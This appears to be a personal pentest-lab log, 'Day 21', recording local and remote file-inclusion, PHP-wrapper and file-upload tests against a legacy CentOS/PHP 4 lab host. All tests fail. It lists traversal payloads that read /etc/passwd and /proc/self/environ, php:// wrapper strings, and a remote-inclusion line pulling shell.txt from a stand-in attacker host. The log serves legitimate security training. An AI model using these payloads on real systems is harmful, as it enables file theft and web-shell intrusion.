# Day 21 – LFI / RFI / File Upload Recon & PHP Wrappers

## Target

- IP: 192.168.56.106
- OS: Linux CentOS 4
- Web Server: Apache 2.0.52
- Backend: PHP 4.3.9
- DBMS: MySQL < 5.0.12

## Objectives

- Identify Local File Inclusion (LFI)
- Test Remote File Inclusion (RFI)
- Check file upload vectors
- Identify PHP wrappers usability
- Prepare attack surface for Day 22

## Step 1 – Endpoint Enumeration

Identified application endpoints:
- /index.php
- /pingit.php

Observed characteristics:
- Legacy PHP version
- No visible WAF
- Weak input validation
- GET and POST parameters reflected

## Step 2 – LFI Testing

Tested common file inclusion parameters and traversal patterns.

### Payloads tested:

- ../../../../etc/passwd
- ../etc/passwd
- ../../../../proc/self/environ
- URL-encoded traversal

### Result:

- No direct file disclosure
- Input appears sanitized or not passed to include()
- LFI not confirmed at this stage

## Step 3 – PHP Wrapper Testing

Tested common PHP wrappers:
- php://filter/convert.base64-encode/resource=index.php
- php://input

### Result:

- No file source disclosure
- Wrappers not accessible via tested parameters

## Step 4 – RFI Testing

Checked for remote inclusion capability with:
- http://attacker-ip/shell.txt
- data:// wrapper (basic test)

### Result:

- RFI not enabled
- allow_url_include likely disabled


## Step 5 – File Upload Recon

Searched for:

- Upload forms
- Multipart POST requests
- Hidden upload endpoints

### Result:

- No file upload functionality identified
- No multipart/form-data handling observed

## Impact

- No LFI/RFI confirmed
- Application attack surface limited to:
- SQL Injection (confirmed Day 20)
- Authentication bypass
- Input reflection
